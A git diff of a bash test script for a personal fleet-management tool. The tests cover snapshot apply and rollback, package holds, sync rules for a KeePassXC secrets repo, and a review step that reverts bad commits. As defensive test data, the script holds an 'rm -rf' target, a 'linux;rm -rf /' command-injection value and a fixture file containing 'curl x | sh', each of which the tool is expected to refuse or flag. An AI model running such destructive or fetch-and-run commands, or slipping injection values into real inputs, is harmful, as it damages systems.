@@ -1,167 +1,204 @@
 #!/usr/bin/env bash
-# tests/fleet -- tools/fleet-apply and tools/fleet push in a temp HOME. Real git repos and a real
-# `script` pty; sudo, bootstrap.sh, ssh, ssh-agent/ssh-add and tailscale are stubs. The stub sudo
-# accepts the password "pw-ok" on stdin for -v and then answers -n from a "ticket" file, which
-# stands in for sudo's per-pty cache. Never touches ~/.ssh, real sudo or another machine.
+# tests/fleet -- tools/fleet (micro) and tools/fleet-apply (every machine). Each fake machine has its
+# own HOME with real git checkouts of the three repos (arch-bootstrap, a bare dotfiles repo whose work
+# tree is that HOME, secrets), all cloned from local bare origins. A real `script` pty; sudo,
+# bootstrap.sh, authorized-keys, ssh, ssh-agent/ssh-add, tailscale and pgrep are stubs. The stub sudo
+# accepts "pw-ok" on stdin for -v and then answers -n from a ticket file (sudo's per-pty cache).
+# Never touches the real HOME, real sudo or another machine.
 set -uo pipefail
 root=$(cd "$(dirname "$0")/.." && pwd)
 t=$(mktemp -d); trap 'rm -rf "$t"' EXIT
-export HOME=$t/home GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t
-mkdir -p "$HOME/projects" "$t/bin"
+export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t
+mkdir -p "$t/bin"
+pass=0 fail=0
+check() { if eval "$2"; then pass=$((pass+1)); echo "pass  $1"; else fail=$((fail+1)); echo "FAIL  $1"; [[ -n ${DEBUG:-} ]] && sed "s/^/        /" <<<"${out:-}" | tail -15; fi; }
+commit() { local d=$1 f=$2 c=$3 m=$4; mkdir -p "$(dirname "$d/$f")"; echo "$c" > "$d/$f"; git -C "$d" add -A; git -C "$d" commit -qm "$m"; git -C "$d" push -q; git -C "$d" rev-parse HEAD; }
 
-# origin with two commits; the clone sits at the first
-git init -q --bare -b main "$t/origin.git"
-git clone -q "$t/origin.git" "$t/seed" 2>/dev/null
-cat > "$t/seed/bootstrap.sh" <<'EOF'
+# ---- origins
+git init -q --bare -b main "$t/ab.git"; git clone -q "$t/ab.git" "$t/ab-seed" 2>/dev/null
+cat > "$t/ab-seed/bootstrap.sh" <<'EOF'
 #!/bin/sh
-# stub: record how it was run, and use sudo the way run() does
+# stub: record how it was run, and use sudo the way run() does; fail on demand
 { echo "args: $*"; echo "ignore: ${PACMAN_IGNORE:-}"; [ -t 0 ] && echo "tty: yes" || echo "tty: no"; sudo -n true && echo "sudo: cached" || echo "sudo: NOT cached"; } >> "$HOME/bootstrap.calls"
+[ ! -e "$HOME/bootstrap.fail" ]
 EOF
-chmod +x "$t/seed/bootstrap.sh"; mkdir -p "$t/seed/tools"; cp "$root/tools/fleet-apply" "$root/tools/fleet" "$t/seed/tools/"
-git -C "$t/seed" add -A && git -C "$t/seed" commit -qm one && first=$(git -C "$t/seed" rev-parse HEAD)
-echo two > "$t/seed/two" && git -C "$t/seed" add -A && git -C "$t/seed" commit -qm two && second=$(git -C "$t/seed" rev-parse HEAD)
-git -C "$t/seed" push -q origin main
-repo=$HOME/projects/arch-bootstrap
-git clone -q "$t/origin.git" "$repo" && git -C "$repo" reset -q --hard "$first"
-git -C "$repo" branch -q --set-upstream-to=origin/main main
-offmain=$(git -C "$repo" commit -q --allow-empty -m local && git -C "$repo" rev-parse HEAD); git -C "$repo" reset -q --hard "$first"
+mkdir -p "$t/ab-seed/tools"; cp "$root/tools/fleet-apply" "$root/tools/fleet" "$t/ab-seed/tools/"
+printf '#!/bin/sh\necho "ak: $*" >> "$HOME/ak.calls"\n' > "$t/ab-seed/tools/authorized-keys"
+chmod +x "$t/ab-seed/bootstrap.sh" "$t/ab-seed/tools/"*
+git -C "$t/ab-seed" add -A; git -C "$t/ab-seed" commit -qm "ab one"; git -C "$t/ab-seed" push -q origin main
+ab1=$(git -C "$t/ab-seed" rev-parse HEAD)
+ab2=$(commit "$t/ab-seed" two ab2 "ab two")
+
+git init -q --bare -b master "$t/dot.git"; git clone -q "$t/dot.git" "$t/dot-seed" 2>/dev/null
+echo rc1 > "$t/dot-seed/.zshrc"; git -C "$t/dot-seed" add -A; git -C "$t/dot-seed" commit -qm "dot one"; git -C "$t/dot-seed" push -q origin master
+dot1=$(git -C "$t/dot-seed" rev-parse HEAD)
+dot2=$(commit "$t/dot-seed" .zshrc rc2 "dot two")
+
+git init -q --bare -b master "$t/sec.git"; git clone -q "$t/sec.git" "$t/sec-seed" 2>/dev/null
+echo v1 > "$t/sec-seed/Passwords.kdbx"; mkdir -p "$t/sec-seed/ssh/authorized_keys"
+for h in self h1 h2; do echo "# $h" > "$t/sec-seed/ssh/authorized_keys/$h"; done
+git -C "$t/sec-seed" add -A; git -C "$t/sec-seed" commit -qm "sec one"; git -C "$t/sec-seed" push -q origin master
+sec1=$(git -C "$t/sec-seed" rev-parse HEAD)
+sec2=$(commit "$t/sec-seed" ssh/keys k2 "sec two")
+
+# ---- one HOME per machine, everything at the FIRST commits
+mkhome() {
+  local H=$t/home-$1; mkdir -p "$H/projects"
+  git clone -q "$t/ab.git" "$H/projects/arch-bootstrap" 2>/dev/null; git -C "$H/projects/arch-bootstrap" reset -q --hard "$ab1"
+  git clone -q --bare "$t/dot.git" "$H/.dot"
+  git --git-dir="$H/.dot" config remote.origin.fetch '+refs/heads/*:refs/remotes/origin/*'; git --git-dir="$H/.dot" fetch -q origin
+  git --git-dir="$H/.dot" --work-tree="$H" checkout -q -f master; git --git-dir="$H/.dot" --work-tree="$H" reset -q --hard "$dot1"
+  git --git-dir="$H/.dot" branch -q --set-upstream-to=origin/master master
+  git clone -q "$t/sec.git" "$H/secrets" 2>/dev/null; git -C "$H/secrets" reset -q --hard "$sec1"
+}
+for h in self h1 h2; do mkhome "$h"; done
 
 cat > "$t/bin/sudo" <<EOF
 #!/bin/bash
-# stub: -S ... -v reads a password from stdin; -n uses the ticket; -k clears it
 for a; do case \$a in -k) rm -f "$t/ticket" ;; esac; done
-if [[ " \$* " == *" -v "* ]]; then IFS= read -r p; [[ \$p == pw-ok ]] && touch "$t/ticket" && exit 0; echo "attempt" >> "$t/sudo.fail"; exit 1; fi
+if [[ " \$* " == *" -v "* ]]; then IFS= read -r p; [[ \$p == pw-ok ]] && touch "$t/ticket" && exit 0; echo attempt >> "$t/sudo.fail"; exit 1; fi
 if [[ " \$* " == *" -n "* ]]; then [[ -e "$t/ticket" ]]; exit; fi
 exit 0
 EOF
-chmod +x "$t/bin/sudo"; export PATH="$t/bin:$PATH"
-fa="$repo/tools/fleet-apply"
+printf '#!/bin/bash\n[[ "$*" == "-x keepassxc" && -e "%s/kpx.${FLEET_HOST:-x}" ]]\n' "$t" > "$t/bin/pgrep"
+chmod +x "$t/bin/"*; export PATH="$t/bin:$PATH"
 
-pass=0 fail=0
-check() { if eval "$2"; then pass=$((pass+1)); echo "pass  $1"; else fail=$((fail+1)); echo "FAIL  $1"; fi; }
+# fleet-apply as machine $1 (its own HOME), request in the remaining args, stdin passed through
+fa() { local h=$1; shift; HOME=$t/home-$h FLEET_HOST=$h FLEET_VAULT_HOST=h1 "$t/home-$h/projects/arch-bootstrap/tools/fleet-apply" "$@"; }
+H=$t/home-self
+abat() { git -C "$t/home-$1/projects/arch-bootstrap" rev-parse HEAD; }
+dotat() { git --git-dir="$t/home-$1/.dot" rev-parse HEAD; }
+secat() { git -C "$t/home-$1/secrets" rev-parse HEAD; }
 
-check "status before any apply: none"         '[[ $("$fa" status) == none ]]'
-check "bad target refused"                    '! echo pw-ok | "$fa" apply "rm -rf" >/dev/null'
-check "stage outside the allowlist refused"   '! echo pw-ok | "$fa" apply main tailnet >/dev/null'
-check "request must be status or apply"       '! "$fa" bash >/dev/null'
+# ================= fleet-apply apply
+check "status before any apply: none"                 '[[ $(fa self status) == none ]]'
+check "apply needs three full ids"                     '! echo pw-ok | fa self apply main "$dot2" "$sec2" >/dev/null'
+check "a stage outside the allowlist is refused"       '! echo pw-ok | fa self apply "$ab2" "$dot2" "$sec2" tailnet >/dev/null'
+check "request must be status|secrets-push|apply"      '! fa self bash >/dev/null'
+rm -f "$t/ticket" "$H/bootstrap.calls" "$H/ak.calls"
+out=$(echo pw-ok | SSH_ORIGINAL_COMMAND="apply $ab2 $dot2 $sec2" fa self 2>&1); rc=$?
+check "apply a snapshot (via SSH_ORIGINAL_COMMAND): rc 0"   '(( rc == 0 ))'
+check "...arch-bootstrap, dotfiles, secrets at exactly it"  '[[ $(abat self) == "$ab2" && $(dotat self) == "$dot2" && $(secat self) == "$sec2" ]]'
+check "...arch-bootstrap still on branch main (ff)"         '[[ $(git -C "$H/projects/arch-bootstrap" symbolic-ref --short HEAD) == main ]]'
+check "...the dotfiles work tree is HOME"                   '[[ $(cat "$H/.zshrc") == rc2 ]]'
+check "...authorized_keys installed from that secrets"      'grep -qx "ak: enable --yes" "$H/ak.calls"'
+check "...bootstrap ran the default stages, tty, sudo cached" 'grep -qx "args: --only packages,aur,services,xmonad,verify" "$H/bootstrap.calls" && grep -qx "tty: yes" "$H/bootstrap.calls" && grep -qx "sudo: cached" "$H/bootstrap.calls"'
+check "...applied records the three ids, rc=0"              '[[ $(fa self status) == "$ab2 $dot2 $sec2 "*" rc=0 stages=packages aur services xmonad verify" ]]'
+check "...password nowhere on disk"                         '! grep -rq pw-ok "$H/.local/state" "$H/bootstrap.calls"'
+rm -f "$H/bootstrap.calls"
+out=$(echo pw-ok | fa self apply "$ab1" "$dot1" "$sec1" services 2>&1); rc=$?
+check "rollback to older ids: code + dotfiles back, detached" '(( rc == 0 )) && [[ $(abat self) == "$ab1" && $(dotat self) == "$dot1" ]] && ! git -C "$H/projects/arch-bootstrap" symbolic-ref -q HEAD >/dev/null'
+check "...secrets never go back"                             '[[ $(secat self) == "$sec2" ]] && grep -q "secrets: already past the snapshot" <<<"$out"'
+check "...only the requested stage"                          'grep -qx "args: --only services" "$H/bootstrap.calls"'
+offmain=$(cd "$t/ab-seed" && git commit -q --allow-empty -m local && git rev-parse HEAD); git -C "$t/ab-seed" reset -q --hard HEAD~1
+git -C "$H/projects/arch-bootstrap" fetch -q "$t/ab-seed" "$offmain" 2>/dev/null
+check "a commit not on origin/main is refused"               '! echo pw-ok | fa self apply "$offmain" "$dot2" "$sec2" >/dev/null 2>&1'
+rm -f "$H/bootstrap.calls" "$H/ak.calls"
+out=$(echo pw-ok | fa self apply "$ab2" "$dot2" "$sec2" keys 2>&1); rc=$?
+check "keys only: moves + authorized_keys, no bootstrap"     '(( rc == 0 )) && [[ $(abat self) == "$ab2" ]] && grep -q "ak: enable" "$H/ak.calls" && [[ ! -e $H/bootstrap.calls ]] && [[ $(fa self status) == *" stages=keys" ]]'
+mkdir -p "$H/.config/fleet"; echo "packages: task 1 RAM window until 2026-10-11" > "$H/.config/fleet/hold"
+rm -f "$t/ticket" "$H/bootstrap.calls"
+out=$(echo pw-ok | fa self apply "$ab2" "$dot2" "$sec2" 2>&1)
+check "hold: packages skipped and reported"                  'grep -q "hold  packages: task 1" <<<"$out" && grep -qx "args: --only aur,services,xmonad,verify" "$H/bootstrap.calls"'
+echo "ignore-pkgs: linux,linux-headers -- task 1 RAM window" > "$H/.config/fleet/hold"; rm -f "$t/ticket" "$H/bootstrap.calls"
+out=$(echo pw-ok | fa self apply "$ab2" "$dot2" "$sec2" 2>&1)
+check "hold ignore-pkgs: packages stage runs, PACMAN_IGNORE passed" 'grep -qx "args: --only packages,aur,services,xmonad,verify" "$H/bootstrap.calls" && grep -qx "ignore: linux,linux-headers" "$H/bootstrap.calls"'
+echo "ignore-pkgs: linux;rm -rf /" > "$H/.config/fleet/hold"
+check "...a malformed ignore-pkgs is refused"                '! echo pw-ok | fa self apply "$ab2" "$dot2" "$sec2" >/dev/null 2>&1'
+rm "$H/.config/fleet/hold"
+rm -f "$t/ticket" "$H/bootstrap.calls" "$t/sudo.fail"
+out=$(echo wrong | fa self apply "$ab2" "$dot2" "$sec2" 2>&1); rc=$?
+check "wrong password: nonzero, bootstrap never ran, one sudo attempt" '(( rc != 0 )) && [[ ! -e $H/bootstrap.calls ]] && [[ $(wc -l < "$t/sudo.fail") == 1 ]]'
+sec3=$(commit "$t/sec-seed" Passwords.kdbx v3 "vault v3"); touch "$t/kpx.self"
+check "snapshot changes the vault while KeePassXC runs: error, secrets not moved" '! echo pw-ok | fa self apply "$ab2" "$dot2" "$sec3" >/dev/null 2>&1 && [[ $(secat self) == "$sec2" ]]'
+rm "$t/kpx.self"
 
-rm -f "$t/ticket" "$HOME/bootstrap.calls"
-out=$(echo pw-ok | SSH_ORIGINAL_COMMAND="apply main" "$fa" 2>&1); rc=$?
-check "apply main (via SSH_ORIGINAL_COMMAND): rc 0"  '(( rc == 0 ))'
-check "...arch-bootstrap fast-forwarded to main"      '[[ $(git -C "$repo" rev-parse HEAD) == "$second" ]]'
-check "...bootstrap ran the default stages"          'grep -qx "args: --only packages,aur,services,xmonad,verify" "$HOME/bootstrap.calls"'
-check "...on a tty, with sudo already cached"        'grep -qx "tty: yes" "$HOME/bootstrap.calls" && grep -qx "sudo: cached" "$HOME/bootstrap.calls"'
-check "...applied records sha and rc=0"              '[[ $("$fa" status) == "$second "*" rc=0 stages=packages aur services xmonad verify" ]]'
-check "...password nowhere on disk"                  '! grep -rq pw-ok "$HOME/.local/state" "$HOME/bootstrap.calls"'
+# ================= fleet-apply secrets-push (h1 is the vault host)
+sp() { fa "$1" secrets-push 2>&1; }
+S2=$t/home-h2/secrets S1=$t/home-h1/secrets
+for h in h1 h2; do git -C "$t/home-$h/secrets" pull -q; done
+check "nothing local: ok, and never pulls"            'git -C "$S2" reset -q --hard "$sec1"; grep -q "nothing to push" <<<"$(sp h2)" && [[ $(git -C "$S2" rev-parse HEAD) == "$sec1" ]]'
+git -C "$S2" pull -q; echo k-h2 > "$S2/ssh/keys"; git -C "$S2" commit -qam "h2 key"
+check "ahead on ssh/ (not the vault host): pushed"     'grep -q "pushed 1 commit" <<<"$(sp h2)" && git -C "$t/sec-seed" pull -q && [[ $(cat "$t/sec-seed/ssh/keys") == k-h2 ]]'
+echo v-h2 > "$S2/Passwords.kdbx"; git -C "$S2" commit -qam "h2 vault"
+check "a vault commit off the vault host: error, not pushed" '! sp h2 >/dev/null; grep -q "source of truth is h1" <<<"$(sp h2)" && git -C "$t/sec-seed" pull -q && [[ $(cat "$t/sec-seed/Passwords.kdbx") == v3 ]]'
+git -C "$S2" reset -q --hard '@{u}'
+git -C "$S1" pull -q; echo v-saved > "$S1/Passwords.kdbx"; commit "$t/sec-seed" ssh/keys k-meanwhile x >/dev/null
+check "vault saved on the vault host, origin moved: committed, rebased, pushed" 'o=$(sp h1); grep -q "committed the saved Passwords.kdbx on h1" <<<"$o" && grep -q "rebased 1" <<<"$o" && git -C "$t/sec-seed" pull -q && [[ $(cat "$t/sec-seed/Passwords.kdbx") == v-saved ]]'
+git -C "$S2" pull -q; echo k-local > "$S2/ssh/keys"; git -C "$S2" commit -qam local; commit "$t/sec-seed" ssh/keys k-remote x >/dev/null
+check "diverged on the same file: error, rebase aborted" '! sp h2 >/dev/null; grep -q "the rebase conflicts" <<<"$(sp h2)" && [[ $(cat "$S2/ssh/keys") == k-local && ! -d $S2/.git/rebase-merge ]]'
+git -C "$S2" reset -q --hard '@{u}'; echo k-x > "$S2/ssh/keys"; git -C "$S2" commit -qam x; commit "$t/sec-seed" Passwords.kdbx v4 x >/dev/null
+check "diverged and origin changed the vault: error"   '! sp h2 >/dev/null; grep -q "the vault is never merged" <<<"$(sp h2)"'
+git -C "$S2" reset -q --hard '@{u}'; echo dirty >> "$S2/Passwords.kdbx"
+check "uncommitted vault off the vault host: error"     '! sp h2 >/dev/null; grep -q "uncommitted changes on h2: Passwords.kdbx" <<<"$(sp h2)"'
+git -C "$S2" checkout -q -- Passwords.kdbx
 
-rm -f "$t/ticket" "$HOME/bootstrap.calls"
-out=$(echo pw-ok | "$fa" apply "${first:0:12}" services 2>&1); rc=$?
-check "pinned SHA on main: rc 0, detached at it"     '(( rc == 0 )) && [[ $(git -C "$repo" rev-parse HEAD) == "$first" ]]'
-check "...only the requested stage"                  'grep -qx "args: --only services" "$HOME/bootstrap.calls"'
-check "SHA not on origin/main refused"               '! echo pw-ok | "$fa" apply "$offmain" >/dev/null 2>&1'
-
-mkdir -p "$HOME/.config/fleet"; echo "packages: task 1 RAM window until 2026-10-11" > "$HOME/.config/fleet/hold"
-rm -f "$t/ticket" "$HOME/bootstrap.calls"
-out=$(echo pw-ok | "$fa" apply main 2>&1)
-check "hold: packages skipped and reported"          'grep -q "hold  packages: task 1 RAM window" <<<"$out" && grep -qx "args: --only aur,services,xmonad,verify" "$HOME/bootstrap.calls"'
-echo "ignore-pkgs: linux,linux-headers -- task 1 RAM window" > "$HOME/.config/fleet/hold"
-rm -f "$t/ticket" "$HOME/bootstrap.calls"
-out=$(echo pw-ok | "$fa" apply main 2>&1)
-check "hold ignore-pkgs: packages stage still runs"  'grep -qx "args: --only packages,aur,services,xmonad,verify" "$HOME/bootstrap.calls"'
-check "...with PACMAN_IGNORE passed through"         'grep -qx "ignore: linux,linux-headers" "$HOME/bootstrap.calls" && grep -q "hold  packages not upgraded: linux,linux-headers" <<<"$out"'
-echo "ignore-pkgs: linux;rm -rf /" > "$HOME/.config/fleet/hold"
-check "...a malformed ignore-pkgs is refused"        '! echo pw-ok | "$fa" apply main >/dev/null 2>&1'
-rm "$HOME/.config/fleet/hold"
-
-rm -f "$t/ticket" "$HOME/bootstrap.calls" "$t/sudo.fail"
-out=$(echo wrong | "$fa" apply main 2>&1); rc=$?
-check "wrong password: nonzero, bootstrap never ran" '(( rc != 0 )) && [[ ! -e $HOME/bootstrap.calls ]]'
-check "...exactly one sudo attempt"                  '[[ $(wc -l < "$t/sudo.fail") == 1 ]]'
-
-# ---- secrets sync (fleet-apply secrets). One bare origin, one clone per host; h1 is the vault host.
-git init -q --bare -b master "$t/secrets.git"
-git clone -q "$t/secrets.git" "$t/sseed" 2>/dev/null
-echo v1 > "$t/sseed/Passwords.kdbx"; mkdir -p "$t/sseed/ssh"; echo k1 > "$t/sseed/ssh/keys"
-git -C "$t/sseed" add -A && git -C "$t/sseed" commit -qm s1 && git -C "$t/sseed" push -q origin master
-for h in self h1 h2; do git clone -q "$t/secrets.git" "$t/sec-$h"; done
-printf '#!/bin/bash\n[[ "$*" == "-x keepassxc" && -e "%s/kpx.${FLEET_HOST:-x}" ]]\n' "$t" > "$t/bin/pgrep"; chmod +x "$t/bin/pgrep"
-up() { git -C "$t/sseed" pull -q; echo "$2" > "$t/sseed/$1"; git -C "$t/sseed" commit -qam "up $1" && git -C "$t/sseed" push -q; }
-sec() { FLEET_SECRETS="$t/sec-$1" FLEET_HOST="$1" FLEET_VAULT_HOST=h1 "$fa" secrets 2>&1; }
-
-check "secrets in sync: ok"                          'grep -q "ok    secrets in sync on h2" <<<"$(sec h2)"'
-up ssh/keys k2
-check "behind on ssh/ only: fast-forwarded"          'grep -q "fast-forwarded 1" <<<"$(sec h2)" && [[ $(cat "$t/sec-h2/ssh/keys") == k2 ]]'
-up Passwords.kdbx v2; touch "$t/kpx.h2"
-check "behind on the vault, KeePassXC up: error"     '! sec h2 >/dev/null && grep -q "KeePassXC is running" <<<"$(sec h2)" && [[ $(cat "$t/sec-h2/Passwords.kdbx") == v1 ]]'
-rm "$t/kpx.h2"
-check "...KeePassXC closed: fast-forwarded"          'sec h2 | grep -q fast-forwarded && [[ $(cat "$t/sec-h2/Passwords.kdbx") == v2 ]]'
-up ssh/keys k3; touch "$t/kpx.h2"
-check "behind on ssh/ only, KeePassXC up: still ff"  'sec h2 | grep -q fast-forwarded && [[ $(cat "$t/sec-h2/ssh/keys") == k3 ]]'
-rm "$t/kpx.h2"
-git -C "$t/sec-h2" pull -q; echo k4 > "$t/sec-h2/ssh/keys"; git -C "$t/sec-h2" commit -qam "h2 key"
-check "ahead on ssh/ (not the vault host): pushed"   'grep -q "pushed 1 commit" <<<"$(sec h2)" && git -C "$t/sseed" pull -q && [[ $(cat "$t/sseed/ssh/keys") == k4 ]]'
-echo v-h2 > "$t/sec-h2/Passwords.kdbx"; git -C "$t/sec-h2" commit -qam "h2 vault"
-check "ahead with a vault commit off the vault host: error, not pushed" '! sec h2 >/dev/null && grep -q "source of truth is h1" <<<"$(sec h2)" && git -C "$t/sseed" pull -q && [[ $(cat "$t/sseed/Passwords.kdbx") == v2 ]]'
-git -C "$t/sec-h2" reset -q --hard '@{u}'
-git -C "$t/sec-h1" pull -q; echo v-h1 > "$t/sec-h1/Passwords.kdbx"; git -C "$t/sec-h1" commit -qam "h1 vault"
-check "ahead with a vault commit ON the vault host: pushed" 'grep -q "pushed 1 commit" <<<"$(sec h1)" && git -C "$t/sseed" pull -q && [[ $(cat "$t/sseed/Passwords.kdbx") == v-h1 ]]'
-git -C "$t/sec-h2" pull -q; echo k-local > "$t/sec-h2/ssh/keys"; git -C "$t/sec-h2" commit -qam local; up ssh/keys k-remote
-check "diverged, same file both sides: error, rebase aborted" '! sec h2 >/dev/null && grep -q "diverged on h2 (1 ahead, 1 behind) and the rebase conflicts" <<<"$(sec h2)" && [[ $(cat "$t/sec-h2/ssh/keys") == k-local ]] && [[ ! -d "$t/sec-h2/.git/rebase-merge" ]]'
-git -C "$t/sec-h2" reset -q --hard '@{u}'
-echo other > "$t/sec-h2/ssh/other"; git -C "$t/sec-h2" add -A; git -C "$t/sec-h2" commit -qm "h2 other"; up ssh/keys k-remote2
-check "diverged, no overlap, vault untouched: rebased + pushed" 'grep -q "rebased 1 local commit(s) onto 1" <<<"$(sec h2)" && git -C "$t/sseed" pull -q && [[ -e "$t/sseed/ssh/other" && $(cat "$t/sseed/ssh/keys") == k-remote2 ]]'
-git -C "$t/sec-h2" pull -q; echo k-h2b > "$t/sec-h2/ssh/keys"; git -C "$t/sec-h2" commit -qam "h2 key b"; up Passwords.kdbx v3
-check "diverged and origin changed the vault: error"  '! sec h2 >/dev/null && grep -q "origin changed Passwords.kdbx -- the vault is never merged" <<<"$(sec h2)"'
-git -C "$t/sec-h2" reset -q --hard '@{u}'; echo dirty >> "$t/sec-h2/Passwords.kdbx"
-check "uncommitted vault OFF the vault host: error"   '! sec h2 >/dev/null && grep -q "uncommitted changes on h2: Passwords.kdbx" <<<"$(sec h2)"'
-git -C "$t/sec-h2" checkout -q -- Passwords.kdbx
-git -C "$t/sec-h1" pull -q; echo v-saved > "$t/sec-h1/Passwords.kdbx"; up ssh/keys k-meanwhile
-check "vault saved on the vault host, origin moved on: committed, rebased, pushed" 'o=$(sec h1); grep -q "committed the saved Passwords.kdbx on h1" <<<"$o" && grep -q "rebased 1" <<<"$o" && git -C "$t/sseed" pull -q && [[ $(cat "$t/sseed/Passwords.kdbx") == v-saved ]] && git -C "$t/sseed" log -1 --format=%s HEAD | grep -q "^Passwords.kdbx: saved .* on h1$"'
-git -C "$t/sec-h1" pull -q; echo x > "$t/sec-h1/ssh/keys"
-check "vault host with a dirty NON-vault file: error"  '! sec h1 >/dev/null && grep -q "uncommitted changes on h1: ssh/keys" <<<"$(sec h1)"'
-git -C "$t/sec-h1" checkout -q -- ssh/keys
-for h in self h1 h2; do git -C "$t/sec-$h" pull -q; done
-
-# ---- fleet push: stub ssh runs fleet-apply locally as the forced command, one state dir per host
+# ================= fleet push / rollback from "self" (micro)
 cat > "$t/bin/ssh" <<EOF
 #!/bin/bash
-host=\${@: -3:1}; host=\${host%%.*}; req="\${@: -2}"
-for a; do case \$a in *.ts.test) host=\${a%%.ts.test} ;; esac; done
-req=""; seen=0; for a; do if (( seen )); then req+="\$a "; fi; [[ \$a == *.ts.test ]] && seen=1; done
-echo "\$host" >> "$t/ssh.hosts"
-FLEET_STATE="$t/state-\$host" FLEET_SECRETS="$t/sec-\$host" FLEET_HOST="\$host" SSH_ORIGINAL_COMMAND="\${req% }" exec "$repo/tools/fleet-apply"
+req=""; seen=0; host=""
+for a; do if (( seen )); then req+="\$a "; fi; [[ \$a == *.ts.test ]] && { seen=1; host=\${a%%.ts.test}; }; done
+echo "\$host \${req%% *}" >> "$t/ssh.log"
+HOME="$t/home-\$host" FLEET_HOST="\$host" SSH_ORIGINAL_COMMAND="\${req% }" exec "$t/home-\$host/projects/arch-bootstrap/tools/fleet-apply"
 EOF
 printf '#!/bin/sh\necho "SSH_AUTH_SOCK=/x; export SSH_AUTH_SOCK; SSH_AGENT_PID=1; export SSH_AGENT_PID;"\n' > "$t/bin/ssh-agent"
 printf '#!/bin/sh\nexit 0\n' > "$t/bin/ssh-add"
 printf '#!/bin/sh\necho "{\\"MagicDNSSuffix\\":\\"ts.test\\"}"\n' > "$t/bin/tailscale"
-chmod +x "$t/bin/"*; touch "$HOME/.ssh_dummy"; mkdir -p "$HOME/.ssh"; touch "$HOME/.ssh/id_ed25519_fleet"
-git -C "$repo" checkout -q main; git -C "$repo" reset -q --hard "$first"
-export FLEET_HOSTS="h1 h2" FLEET_SELF_HOST=self FLEET_STATE=$t/state-self FLEET_SECRETS=$t/sec-self FLEET_HOST=self FLEET_VAULT_HOST=h1
-mkdir -p "$t/state-h2"; echo "$second 2026-10-04T00:00:00 rc=0 stages=x" > "$t/state-h2/applied"   # h2 already has it
-rm -f "$t/ticket" "$t/ssh.hosts"
-out=$(echo pw-ok | "$repo/tools/fleet" push 2>&1); rc=$?
-check "push: self applied locally, h1 over ssh"      'grep -q "^self .*ok (${second:0:7})" <<<"$out" && grep -q "^h1 .*ok (${second:0:7})" <<<"$out"'
-check "...h2 skipped (already at main)"              'grep -q "^h2 .*skip (already at ${second:0:7})" <<<"$out"'
-check "...h1 now records main"                       '[[ $(cat "$t/state-h1/applied") == "$second "*" rc=0 "* ]]'
-check "...secrets synced first, vault host (h1) first" 'awk "/=== secrets/{f=1;next} f&&/secrets/{print;exit}" <<<"$out" | grep -q "on h1"'
-# h2's secrets diverge: push reports it FAILED and does not update it; the others still run
-git -C "$t/sec-h2" pull -q; echo k-h2 > "$t/sec-h2/ssh/keys"; git -C "$t/sec-h2" commit -qam h2; up ssh/keys k-origin
-echo "$first 2026-10-04T00:00:00 rc=0 stages=x" > "$t/state-h2/applied"
-rm -f "$t/ticket"
-out=$(echo pw-ok | "$repo/tools/fleet" push 2>&1); rc=$?
-check "push: h2 with diverged secrets FAILED, not updated" 'grep -q "^h2 .*FAILED secrets out of sync, not updated: diverged" <<<"$out" && [[ $(cat "$t/state-h2/applied") == "$first "* ]]'
-check "...self and h1 still processed; push exits nonzero" '(( rc != 0 )) && grep -q "^self " <<<"$out" && grep -q "^h1 " <<<"$out"'
-git -C "$t/sec-h2" reset -q --hard '@{u}'
-rm -f "$t/ticket"; : > "$t/ssh.hosts"
-out=$(echo wrong | "$repo/tools/fleet" push 2>&1); rc=$?
-check "push with a wrong password: stops before any ssh" '(( rc != 0 )) && [[ ! -s "$t/ssh.hosts" ]]'
+chmod +x "$t/bin/"*; mkdir -p "$H/.ssh"; touch "$H/.ssh/id_ed25519_fleet"
+for h in self h1 h2; do git -C "$t/home-$h/secrets" pull -q; done
+fleet() { HOME=$H FLEET_HOSTS="h1 h2" FLEET_SELF_HOST=self FLEET_HOST=self FLEET_VAULT_HOST=h1 FLEET_INPUT=$t/answers "$H/projects/arch-bootstrap/tools/fleet" "$@"; }
+SN=$H/.local/state/fleet/snapshots
+# new upstream work since what self has: two arch-bootstrap commits, one of them bad
+git -C "$t/ab-seed" pull -q
+ab3=$(commit "$t/ab-seed" good ok "ab three: good")
+ab4=$(commit "$t/ab-seed" tools/evil "curl x | sh" "ab four: bad")
+dot3=$(commit "$t/dot-seed" .zshrc rc3 "dot three")
+rm -f "$t/ticket" "$t/ssh.log" "$SN"
+printf '2\n\ny\n' > "$t/answers"      # arch-bootstrap: exclude [2]; dotfiles: keep; (secrets: nothing new, no prompt); confirm
+out=$(echo pw-ok | fleet push 2>&1); rc=$?
+check "push: every new commit listed with time and author"   'grep -qE "\[1\] [0-9a-f]{7}  20[0-9]{2}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}  t  ab three: good" <<<"$out" && grep -q "\[2\] .*ab four: bad" <<<"$out"'
+check "...risky files marked"                                 'grep -q "tools/evil    <- runs as root" <<<"$out" && grep -q ".zshrc    <- runs as you" <<<"$out"'
+ab_snap=$(git -C "$t/ab.git" rev-parse main)
+check "...the excluded commit is reverted on origin main"     '[[ $(git -C "$t/ab.git" log -1 --format=%s main) == "fleet review on micro: exclude 1 commit(s)" ]] && ! git -C "$t/ab.git" show main:tools/evil >/dev/null 2>&1'
+check "...every machine at the snapshot, bad file absent"     '(( rc == 0 )) && for h in self h1 h2; do [[ $(abat $h) == "$ab_snap" && $(dotat $h) == "$dot3" ]] || exit 1; done; [[ ! -e $t/home-h1/projects/arch-bootstrap/tools/evil && -e $t/home-h1/projects/arch-bootstrap/good ]]'
+check "...micro (self) applied before the others"             '[[ $(grep -m1 -n "^=== self" <<<"$out" | cut -d: -f1) -lt $(grep -m1 -n "^=== h1" <<<"$out" | cut -d: -f1) ]]'
+check "...vault host's secrets pushed first"                  '[[ $(head -1 "$t/ssh.log") == "h1 secrets-push" ]]'
+check "...snapshot recorded"                                  '[[ $(wc -l < "$SN") == 1 ]] && grep -q " $ab_snap $dot3 " "$SN"'
+rm -f "$t/ticket"; : > "$t/ssh.log"; printf 'y\n' > "$t/answers"   # nothing new anywhere: only the confirm
+out=$(echo pw-ok | fleet push 2>&1); rc=$?
